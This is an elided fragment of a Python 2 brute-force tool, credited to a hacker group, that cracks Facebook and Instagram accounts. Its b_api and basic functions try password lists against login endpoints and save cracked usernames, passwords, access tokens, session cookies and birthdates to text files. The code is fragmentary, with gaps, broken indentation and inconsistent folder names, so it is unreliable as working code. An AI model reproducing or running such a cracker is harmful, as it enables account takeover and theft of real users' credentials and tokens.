...
"""%s
 ...
 - Author      : DESTROY 
 - Telegram C : https://t.me/DESTROYHACKER
 - Telegram  : DESTROYHACKER 
 - Team        : DARK WEB HACKER AFRIDI
 - github       : github.com/DESTROY-HACKER
 - From         : Canada
 - version     : 1.1
...
def masuk():
    ...
    if rom in(""):
    	...
    	try:
            ...
            print ('\n%s[√] Login berdestroy, mohon tunggu '%(H));jeda(2)
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                        ...
                        if ind == '':
                            ...
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s destroy/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] akun %sCP %stersimpan di > %sdestroy/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
    ...
    def b_api(self, user, zona):
        ...
        for pw in zona:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                open('destroy/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
                ...
                try:
                    ...
                    open('Destroy/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                ...
                open('Destroy/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
    ...
    def basic(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                open('Doctor/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
				...
				if "checkpoint_url" in str(data):
					...
					if len(status_foll) != 1:
						...
						with open("okeh.txt", "a")as simpan:
							simpan.write(" [Berdestroy] "+user+" ◊ "+pw+"\n")
						ok.append(user)
						#follow(ses,user)
					break
...
def uas():
    ...
    if u == '':
    	...
    	try:
            ...
            print ("\n%s [√] berdestroy mengganti user agent"%(H));jeda(2);menu()
...
def menu():
    ...
    print (' [%s07%s] Cek destroy crack'%(K,P)) 
    ...
    if unik == '':
    	...
    	print "\n%s [01] destroy crack akun facebook "%(P)
        print "%s [02] destroy crack akun instagram "%(P)
        c = raw_input('\n%s [?] Menu : %s'%(P,K))
    	destroyl(c)
    elif unik in['8','08']:
...
def destroyl(c):
	if c in[""]:
		...
		try:
			...
			total = open("destroy/%s"%(file)).read().splitlines()
			...
			print("\n%s [!] tidak ada destroy "%(M))
			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
	elif c in["2","02"]:
		print "\n%s [01] destroy crack akun %sOK "%(P,H)
        print "%s [02] destroy crack akun %sCP "%(P,K)
        while True:
        	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
		if rom in['1','01']:
			try:
				...
				exit (M+"\n [!] tidak ada destroy awokawokawok")
		elif rom in['2','02']:
			try:
